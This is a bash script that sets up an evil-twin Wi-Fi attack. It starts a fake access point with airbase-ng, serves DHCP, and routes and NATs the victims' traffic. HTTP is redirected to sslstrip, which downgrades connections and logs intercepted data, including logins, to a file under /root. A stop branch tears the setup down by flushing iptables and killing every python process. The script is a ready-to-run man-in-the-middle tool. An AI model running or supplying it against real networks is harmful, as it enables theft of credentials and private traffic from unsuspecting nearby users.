#!/bin/bash

# Configure
WLAN=wlan0

case $1 in
	"stop")
		echo "Killing airbase-ng..."
		pkill airbase-ng
		sleep 3
		echo "Killing dhcpd3..."
		pkill dhcpd3
		sleep 3
		echo "Flushing iptables..."
		iptables --flush
		iptables --table nat --flush
		iptables --delete-chain
		iptables --table nat --delete-chain
		echo "Killing sslstrip (the hard way)..."
		killall python
		echo "Disabling IP Forwarding"
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo "Disabling monitor mode on $WLAN..."
		airmon-ng stop mon0
		#echo "Demoving alfa and bringing it back - vmware only"
		#rmmod rtl8187
		#rfkill block all
		#rfkill unblock all
		#modprobe rtl8187
		#sleep 5
		#rfkill unblock all
		#echo "Bringing up wlan0"
		#ifconfig wlan0 up
		;;
	"start")
		echo "Enable $WLAN in monitor mode..."
		airmon-ng start $WLAN
		sleep 5
		echo "Starting fake AP..."
		airbase-ng -P -F airbase-dump -c 11 mon0 &
		sleep 5;
		echo "Configuring interface at0 according to dhcpd3 config"
		ifconfig at0 up
		ifconfig at0 10.0.0.254 netmask 255.255.255.0
		echo "Adding a route"
		route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.254
		sleep 5;
		echo "Configuring iptables"
		iptables -P FORWARD ACCEPT
		iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
		echo "Enabling sslstrip interception"
		iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
		cd /pentest/web/sslstrip/ && python sslstrip.py -a -w /root/sslstrip.$$.out &
		sleep 2;
		cd ~
		echo "Clearing lease table"
		echo > '/var/lib/dhcp3/dhcpd.leases'
		echo "starting new DHCPD server"
		service dhcp3-server start
		sleep 5;
		echo "Enabling IP Forwarding...ENJOY the SHOW"
		echo "1" > /proc/sys/net/ipv4/ip_forward
		;;
	*)
		echo "Usage: $0 <start|stop>"
		exit 1
		;;
esac
exit 0
